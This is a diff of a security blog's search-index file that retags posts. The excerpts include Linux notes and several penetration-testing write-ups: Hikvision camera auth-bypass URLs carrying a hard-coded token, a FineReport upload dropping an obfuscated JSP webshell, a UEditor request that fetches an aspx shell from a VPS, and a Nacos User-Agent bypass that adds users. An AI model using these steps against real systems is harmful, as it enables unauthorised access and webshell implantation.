@@ -48,21 +48,21 @@ var store = [{
         "teaser": null
       },{
         "title": "Linux - 查看和修改文件权限",
-        "excerpt":"查看文件权限  在linux操作系统中使用ls -l可以看到当前目录下文件或者文件夹的一些详细信息      第1个字符代表文件类型     第2~10个字符表示文件权限  r表是读 (Read) 、w表示写 (Write) 、x表示执行 (Execute)     前三个表示文件拥有者的权限   中间三个表示文件所属组拥有的权限   后三个表示其他用户拥有的权限   比如这张图片表示无论是文件拥有者还是所属组或者是其他用户，都有读写权限。另外，图中的两个 root 分别代表文件的拥有者和文件所属组。      修改文件权限   方式一  chmod [-R]  xyz 文件或目录     xyz分别为拥有者和所属组和其他用户所具有的权限的数值表示   各权限所代表的的数据r:4   w:2  x:1  eg. -rwxrwx---    owner=rwx=4+2+1=7  group=rwx=4+2+1=7 others=---=0+0+0=0   770  方式二  chmod [-R] u=rwx,g=rx,o=r  文件或目录     修改文件所属用户和组  chown [-R] root 文件或目录 //改用户  chgrp  [-R] root 文件或目录 //改所属组  ","categories": ["linux-tricks"],
+        "excerpt":"查看文件权限  在linux操作系统中使用ls -l可以看到当前目录下文件或者文件夹的一些详细信息      第1个字符代表文件类型     第2~10个字符表示文件权限  r表是读 (Read) 、w表示写 (Write) 、x表示执行 (Execute)     前三个表示文件拥有者的权限   中间三个表示文件所属组拥有的权限   后三个表示其他用户拥有的权限   比如这张图片表示无论是文件拥有者还是所属组或者是其他用户，都有读写权限。另外，图中的两个 root 分别代表文件的拥有者和文件所属组。      修改文件权限   方式一  chmod [-R]  xyz 文件或目录     xyz分别为拥有者和所属组和其他用户所具有的权限的数值表示   各权限所代表的的数据r:4   w:2  x:1  eg. -rwxrwx---    owner=rwx=4+2+1=7  group=rwx=4+2+1=7 others=---=0+0+0=0   770  方式二  chmod [-R] u=rwx,g=rx,o=r  文件或目录     修改文件所属用户和组  chown [-R] root 文件或目录 //改用户  chgrp  [-R] root 文件或目录 //改所属组  ","categories": ["tricks"],
         "tags": ["linux"],
-        "url": "/linux-tricks/chmod/",
+        "url": "/tricks/chmod/",
         "teaser": null
       },{
         "title": "写下服务器的笔记",
-        "excerpt":"写下服务器的笔记 前言 最近买了一年的国内某云的服务器。这篇文章主要记录一下我在这台服务器上做的事情，避免以后采坑。操作系统是Ubuntu18.04，持续更新。 换源 备份源文件 $ sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak 更改文件权限使其可编辑 $ sudo chmod 777 /etc/apt/sources.list Ubuntu 18.04 阿里源 deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-backports...","categories": ["linux-tricks"],
+        "excerpt":"写下服务器的笔记 前言 最近买了一年的国内某云的服务器。这篇文章主要记录一下我在这台服务器上做的事情，避免以后采坑。操作系统是Ubuntu18.04，持续更新。 换源 备份源文件 $ sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak 更改文件权限使其可编辑 $ sudo chmod 777 /etc/apt/sources.list Ubuntu 18.04 阿里源 deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-backports...","categories": ["tricks"],
         "tags": ["linux"],
-        "url": "/linux-tricks/server/",
+        "url": "/tricks/server/",
         "teaser": null
       },{
         "title": "Linux - Crontab",
-        "excerpt":"简介 最近在打CTF的时候了解到了/etc/crontab这个文件，借机了解一下。通过crontab 命令，我们可以在固定的间隔时间执行指定的系统指令或 shell script脚本，精确到分。 命令格式 crontab [-u user] file crontab [-u user] [ -e | -l | -r ] 命令参数 Crontab分类 系统执行的工作：系统周期性所要执行的工作，如备份系统数据、清理缓存。文件存放在 /etc/crontab 中。 个人执行的工作：某个用户定期要做的工作，例如每隔10分钟检查邮件服务器是否有新信，这些工作可由每个用户自行设置 。各用户的crontab文件存放在/var/spool/cron目录 日志文件 如果运行出错，linux会发邮件到 /var/mail/mail 或者 /var/spool/mail/mail 使用实例 每5分钟执行一次 /reset.sh */5 * * * * sh /reset.sh 每晚21: 30重启 cron 30 21 * * *...","categories": ["linux-tricks"],
+        "excerpt":"简介 最近在打CTF的时候了解到了/etc/crontab这个文件，借机了解一下。通过crontab 命令，我们可以在固定的间隔时间执行指定的系统指令或 shell script脚本，精确到分。 命令格式 crontab [-u user] file crontab [-u user] [ -e | -l | -r ] 命令参数 Crontab分类 系统执行的工作：系统周期性所要执行的工作，如备份系统数据、清理缓存。文件存放在 /etc/crontab 中。 个人执行的工作：某个用户定期要做的工作，例如每隔10分钟检查邮件服务器是否有新信，这些工作可由每个用户自行设置 。各用户的crontab文件存放在/var/spool/cron目录 日志文件 如果运行出错，linux会发邮件到 /var/mail/mail 或者 /var/spool/mail/mail 使用实例 每5分钟执行一次 /reset.sh */5 * * * * sh /reset.sh 每晚21: 30重启 cron 30 21 * * *...","categories": ["tricks"],
         "tags": ["linux"],
-        "url": "/linux-tricks/crontab/",
+        "url": "/tricks/crontab/",
         "teaser": null
       },{
         "title": "LFI - 可利用敏感文件",
@@ -91,7 +91,7 @@ var store = [{
       },{
         "title": "CVE-2017-7921 - Hikvision摄像头越权访问",
         "excerpt":"body=”laCurrentLanguage” &amp;&amp; country=”CN” 查看用户列表 /Security/users?auth=YWRtaW46MTEK 获取监控快照 /onvif-http/snapshot?auth=YWRtaW46MTEK 下载配置文件 /System/configurationFile?auth=YWRtaW46MTEK 解码配置文件 https://github.com/chrisjd20/hikvision_CVE-2017-7921_auth_bypass_config_decryptor 安装脚本依赖文件 sudo python3 -m pip install pycryptodome 解码，可得到用户名和密码 ./decrypt_configurationFile.py &lt;nameofdownloadedconfig&gt; CVE-2021-36260-HikvisionRCE: # Exploit Title: Hikvision Web Server Build 210702 - Command Injection # Exploit Author: bashis # Vendor Homepage: https://www.hikvision.com/ # Version: 1.0 # CVE: CVE-2021-36260 # Reference: https://watchfulip.github.io/2021/09/18/Hikvision-IP-Camera-Unauthenticated-RCE.html...","categories": ["vul"],
-        "tags": ["hikvision","unserialize"],
+        "tags": ["hikvision","unserialize","web"],
         "url": "/vul/CVE-2017-7921/",
         "teaser": null
       },{
@@ -151,19 +151,19 @@ var store = [{
       },{
         "title": "帆软V8文件上传漏洞",
         "excerpt":"遇到的一个帆软V8文件上传漏洞，url得加上/WebReport/ReportServer?op=fs_load&amp;cmd=fs_signin才能正常访问，不然是空白页 弱口令admin/admin 进去之后长这样 启动水滴工具，访问本地43023端口，用这个模块上传冰蝎jsp免杀马 &lt;%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*,sun.misc.*, sun.misc.BASE64Encoder,javax.crypto.spec.SecretKeySpec\" %&gt; &lt;%@ page import=\"java.io.BufferedReader\" %&gt; &lt;%@ page import=\"java.io.IOException\" %&gt; &lt;%@ page import=\"java.lang.reflect.Method\" %&gt; &lt;jsp:scriptlet&gt; String pp =\\u0022\\u0050\\u004f\\u0053\\u0054\\u0022; &lt;/jsp:scriptlet&gt; &lt;% class b6 extends \\u0042\\u0041\\u0053\\u0045\\u0036\\u0034\\u0044\\u0065\\u0063\\u006f\\u0064\\u0065\\u0072{} b6 b6 = new b6(); %&gt; &lt;%! public byte[] gg(byte[] a1,String k) { try { javax.crypto./*123*/Cipher c = javax.crypto.Cipher.\\u0067\\u0065\\u0074\\u0049\\u006e\\u0073\\u0074\\u0061\\u006e\\u0063e(\"AES/ECB/PKCS5Padding\"); c.init(javax.crypto.Cipher.DECRYPT_MODE,...","categories": ["vul"],
-        "tags": ["finereport","nday"],
+        "tags": ["finereport","nday","web"],
         "url": "/vul/finereport/",
         "teaser": null
       },{
         "title": "Ueditor任意文件上传漏洞",
         "excerpt":"Ueditor任意文件上传漏洞 0x00 漏洞概述 Ueditor是百度开发的一个网站编辑器，目前已经不对其进行后续开发和更新，该漏洞只存在于该编辑器的.net版本。其他的php、jsp、asp版本不受此UEditor的漏洞的影响。 0x01 POC 访问/ueditor/net/controller.ashx 控制器文件，当出现下图的时候表示编辑器成功运行，且漏洞存在。 但也不一定，比如上图的路径为/scripts/ueditor/net/controller.ashx 0x02 漏洞利用 现在vps上起一个http服务上面挂着一张jpg格式的aspx免杀马 Expoliet: POST /vul_ip/UEditor/net/controller.ashx?action=catchimage HTTP/1.1 Host: x.x.x.x Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 sec-ch-ua-platform: \"Windows\" sec-ch-ua: \"Google Chrome\";v=\"100\", \"Chromium\";v=\"100\", \"Not=A?Brand\";v=\"24\" sec-ch-ua-mobile: ?0 Connection: close...","categories": ["vul"],
-        "tags": ["ueditor","nday"],
+        "tags": ["ueditor","nday","web"],
         "url": "/vul/ueditor/",
         "teaser": null
       },{
         "title": "Nacos身份认证绕过漏洞",
         "excerpt":"Nacos身份认证绕过漏洞  0x00 漏洞概述  Nacos是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。User-Agent为Nacos-Server时可绕过认证，添加新用户。   0x01 POC  添加User-Agent: Nacos-Server后访问http://target:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9可以看到返回值为200,且内容中是否包含pageItems      0x02 漏洞利用  添加User-Agent: Nacos-Server后使用POST方法请求                         http://target:8848/nacos/v1/auth/users?username=yyj&amp;password=yyj 添加一个新用户      用创建的用户名和密码成功登录后台     ","categories": ["vul"],
-        "tags": ["nacos","nday"],
+        "tags": ["nacos","nday","web","unserialize"],
         "url": "/vul/nacos/",
         "teaser": null
       }]
